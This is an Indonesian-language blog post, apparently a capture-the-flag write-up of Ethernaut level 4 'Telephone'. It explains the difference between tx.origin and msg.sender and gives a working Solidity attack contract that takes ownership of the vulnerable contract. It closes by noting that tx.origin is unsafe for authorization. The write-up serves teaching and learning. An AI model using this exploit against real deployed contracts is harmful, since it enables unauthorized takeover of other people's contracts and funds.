<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Level 4 - Telephone | Ardias</title>
<meta name="keywords" content="Ethernaut">
<meta name="description" content="Pada level kali ini kita diberikan source code smart contractnya seperti berikut
// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Telephone { address public owner; constructor() { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Goals : Mendapatkan ownership dari contract level ini
Breaking the code Pada smart contract ini hanya terdapat satu function saja yaitu changeOwner(_owner)
function changeOwner(address _owner) public { if (tx.">
<meta name="author" content="Ardias">
<link rel="canonical" href="https://agilfchx.github.io/posts/level4-telephone/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css" integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U&#43;6hYRq/Ez/nm5vg=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://agilfchx.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://agilfchx.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://agilfchx.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://agilfchx.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://agilfchx.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Level 4 - Telephone" />
<meta property="og:description" content="Pada level kali ini kita diberikan source code smart contractnya seperti berikut
// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Telephone { address public owner; constructor() { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Goals : Mendapatkan ownership dari contract level ini
Breaking the code Pada smart contract ini hanya terdapat satu function saja yaitu changeOwner(_owner)
function changeOwner(address _owner) public { if (tx." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://agilfchx.github.io/posts/level4-telephone/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-09-10T12:47:54+07:00" />
<meta property="article:modified_time" content="2023-09-10T12:47:54+07:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Level 4 - Telephone"/>
<meta name="twitter:description" content="Pada level kali ini kita diberikan source code smart contractnya seperti berikut
// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Telephone { address public owner; constructor() { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Goals : Mendapatkan ownership dari contract level ini
Breaking the code Pada smart contract ini hanya terdapat satu function saja yaitu changeOwner(_owner)
function changeOwner(address _owner) public { if (tx."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://agilfchx.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Level 4 - Telephone",
      "item": "https://agilfchx.github.io/posts/level4-telephone/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Level 4 - Telephone",
  "name": "Level 4 - Telephone",
  "description": "Pada level kali ini kita diberikan source code smart contractnya seperti berikut\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Telephone { address public owner; constructor() { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Goals : Mendapatkan ownership dari contract level ini\nBreaking the code Pada smart contract ini hanya terdapat satu function saja yaitu changeOwner(_owner)\nfunction changeOwner(address _owner) public { if (tx.",
  "keywords": [
    "Ethernaut"
  ],
  "articleBody": "Pada level kali ini kita diberikan source code smart contractnya seperti berikut\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Telephone { address public owner; constructor() { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Goals : Mendapatkan ownership dari contract level ini\nBreaking the code Pada smart contract ini hanya terdapat satu function saja yaitu changeOwner(_owner)\nfunction changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } Jika kita perhatikan code di atas untuk changeOwner terdapat pengecekkan, jika tx.origin != msg.sender maka kita bisa ganti ownership contractnya.\nExplainoit (Explain \u0026 Exploit) tx.origin adalah global variabel dalam Solidity yang mengembalikan alamat akun yang mengirimkan transaksi (sender of the transaction). Jika kita gambarkan maksud dari ini adalah\nAlice -\u003e telephone.changeOwner() tx.origin = Alice msg.sender = Alice Jadi Alice akan memanggil function changeOwner dan di dalam function changeOwner terdapat tx.origin \u0026 msg.sender yang mempunyai nilai yang sama yaitu Alice\nPerbedaannya adalah ketika terjadi pemanggilan chain function maka nilai dari tx.origin \u0026 msg.sender akan berbeda. Berikut jika kita gambarkan lagi\nAlice -\u003e ContractAttack.something -\u003e Telephone.changeOwner msg.sender = address(ContractAttack) tx.origin = Alice Jadi Alice akan memanggil ContractAttack.something selanjutnya yaitu Telephone.changeOwner maka nantinya msg.sender ini mempunyai nilai address dari ContractAttack dan tx.origin bukan address dari ContractAttack melainkan Alice.\ntx.origin vs msg.sender Infographic Source\nIntinya adalah ketika seseorang memanggil ContractA atau ContractB dan akhirnya memanggil ContractTelephone, maka tx.origin akan bernilai address pertama kali yang memulai transaksi dan msg.sender akan bernilai address contract terakhir yang dipanggil\nDari penjelasan ini kita akan membuat sebuah malicious contract atau Attack.sol yang nantinya akan mengakses Telephone.changeOwner() agar dapat mengubah ownership dari contractnya menggunakan Remix IDE.\nSeperti level sebelumnya, buat sebuah folder bernama 4_Telephone dan didalamnya terdapat 2 file yaitu Telephone.sol dan Attack.sol. Untuk Telephone.sol cukup masukkan saja smart contract yang dikasih dan untuk Attack.sol seperti berikut\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import './Telephone.sol'; contract Attack{ Telephone telephone = Telephone(**INSTANCE-ADDRESS**); function change() public { telephone.changeOwner(msg.sender); } } Ganti INSTANCE-ADDRESS dengan instance address yang sudah diberikan ketika start instance. Compile Attack.sol , ganti Environment di Deploy menjadi Injected Provider - Metamask dan Deploy contract Attack.sol\nKlik tombol change , lalu pada browser cek apakah ownership contractnya sudah berubah atau belum. Jika sudah Submit instance dan selesai level ini\nContract address berubah Sebenarnya jika kalian search tx.origin ini banyak yang bilang vulnerable terhadap phising attacks (Source: Solidity by Example). Jadi tx.origin ini tidak cocok untuk authorization ownership.\nPenjelasan kerentanan ini dapat digunakan phising pada Ethernaut ",
  "wordCount" : "417",
  "inLanguage": "en",
  "datePublished": "2023-09-10T12:47:54+07:00",
  "dateModified": "2023-09-10T12:47:54+07:00",
  "author":{
    "@type": "Person",
    "name": "Ardias"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://agilfchx.github.io/posts/level4-telephone/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Ardias",
    "logo": {
      "@type": "ImageObject",
      "url": "https://agilfchx.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://agilfchx.github.io/" accesskey="h" title="Ardias (Alt + H)">
                <img src="https://agilfchx.github.io/logo.png" alt="" aria-label="logo"
                    height="35">Ardias</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://agilfchx.github.io/posts" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://agilfchx.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://agilfchx.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://agilfchx.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://agilfchx.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      Level 4 - Telephone
    </h1>
    <div class="post-meta"><span title='2023-09-10 12:47:54 +0700 +0700'>September 10, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;Ardias

</div>
  </header> 
  <div class="post-content"><p>Pada level kali ini kita diberikan source code smart contractnya seperti berikut</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Telephone</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() {
</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tx.origin <span style="color:#f92672">!=</span> msg.sender) {
</span></span><span style="display:flex;"><span>      owner <span style="color:#f92672">=</span> _owner;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><blockquote>
<p><strong>Goals</strong> : Mendapatkan <code>ownership</code> dari contract level ini</p>
</blockquote>
<h3 id="breaking-the-code">Breaking the code<a hidden class="anchor" aria-hidden="true" href="#breaking-the-code">#</a></h3>
<p>Pada smart contract ini hanya terdapat satu function saja yaitu <code>changeOwner(_owner)</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">changeOwner</span>(<span style="color:#66d9ef">address</span> _owner) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (tx.origin <span style="color:#f92672">!=</span> msg.sender) {
</span></span><span style="display:flex;"><span>      owner <span style="color:#f92672">=</span> _owner;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>Jika kita perhatikan code di atas untuk <code>changeOwner</code> terdapat pengecekkan, jika <code>tx.origin != msg.sender</code> maka kita bisa ganti ownership contractnya.</p>
<h3 id="explainoit-explain--exploit">Explainoit (Explain &amp; Exploit)<a hidden class="anchor" aria-hidden="true" href="#explainoit-explain--exploit">#</a></h3>
<p><code>tx.origin</code> adalah global variabel dalam Solidity yang <strong><em>mengembalikan alamat akun yang mengirimkan transaksi</em></strong> (sender of the transaction). Jika kita gambarkan maksud dari ini adalah</p>
<pre tabindex="0"><code>Alice -&gt; telephone.changeOwner()
tx.origin = Alice
msg.sender = Alice
</code></pre><p>Jadi Alice akan memanggil function <code>changeOwner</code> dan di dalam function <code>changeOwner</code> terdapat <code>tx.origin</code> &amp; <code>msg.sender</code> yang mempunyai nilai yang sama yaitu Alice</p>
<p>Perbedaannya adalah ketika terjadi pemanggilan chain function maka nilai dari <code>tx.origin</code> &amp; <code>msg.sender</code> akan berbeda. Berikut jika kita gambarkan lagi</p>
<pre tabindex="0"><code>Alice -&gt; ContractAttack.something -&gt; Telephone.changeOwner
msg.sender = address(ContractAttack)
tx.origin = Alice
</code></pre><p>Jadi Alice akan memanggil <code>ContractAttack.something</code> selanjutnya yaitu <code>Telephone.changeOwner</code> maka nantinya <code>msg.sender</code> ini mempunyai nilai <em>address</em> dari <em>ContractAttack</em> dan <code>tx.origin</code> bukan <em>address</em> dari <em>ContractAttack</em> melainkan Alice.</p>
<figure class="align-center ">
    <img loading="lazy" src="/images/20230910/Untitled.png#center"/> <figcaption>
            tx.origin vs msg.sender
        </figcaption>
</figure>

<blockquote>
<p><a href="https://davidkathoh.medium.com/tx-origin-vs-msg-sender-93db7f234cb9">Infographic Source</a></p>
</blockquote>
<p>Intinya adalah ketika seseorang memanggil ContractA atau ContractB dan akhirnya memanggil ContractTelephone, maka <code>tx.origin</code> akan bernilai address <strong>pertama kali</strong> yang memulai transaksi dan <code>msg.sender</code> akan bernilai address contract <strong>terakhir</strong> yang dipanggil</p>
<p>Dari penjelasan ini kita akan membuat sebuah malicious contract atau <code>Attack.sol</code> yang nantinya akan mengakses <code>Telephone.changeOwner()</code> agar dapat mengubah ownership dari contractnya menggunakan Remix IDE.</p>
<p>Seperti level sebelumnya, buat sebuah folder bernama <code>4_Telephone</code> dan didalamnya terdapat 2 file yaitu <code>Telephone.sol</code> dan <code>Attack.sol</code>. Untuk <code>Telephone.sol</code> cukup masukkan saja smart contract yang dikasih dan untuk <code>Attack.sol</code> seperti berikut</p>
<pre tabindex="0"><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &#39;./Telephone.sol&#39;;

contract Attack{
    Telephone telephone = Telephone(**INSTANCE-ADDRESS**);

    function change() public {
        telephone.changeOwner(msg.sender);
    }
}
</code></pre><p>Ganti <code>INSTANCE-ADDRESS</code> dengan instance address yang sudah diberikan ketika start instance. Compile <code>Attack.sol</code> , ganti Environment di Deploy menjadi <code>Injected Provider - Metamask</code> dan Deploy contract <code>Attack.sol</code></p>
<p>Klik tombol <code>change</code> , lalu pada browser cek apakah ownership contractnya sudah berubah atau belum. Jika sudah Submit instance dan selesai level ini</p>
<figure class="align-center ">
    <img loading="lazy" src="/images/20230910/Untitled%201.png#center"/> <figcaption>
            Contract address berubah
        </figcaption>
</figure>

<p>Sebenarnya jika kalian search <code>tx.origin</code> ini banyak yang bilang vulnerable terhadap <em>phising attacks</em> (Source: <a href="https://solidity-by-example.org/hacks/phishing-with-tx-origin/">Solidity by Example</a>). Jadi <code>tx.origin</code> ini tidak cocok untuk authorization ownership.</p>
<figure class="align-center ">
    <img loading="lazy" src="/images/20230910/Untitled%202.png#center"/> <figcaption>
            Penjelasan kerentanan ini dapat digunakan phising pada Ethernaut
        </figcaption>
</figure>



  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://agilfchx.github.io/tags/ethernaut/">Ethernaut</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2023 <a href="https://agilfchx.github.io/">Ardias</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
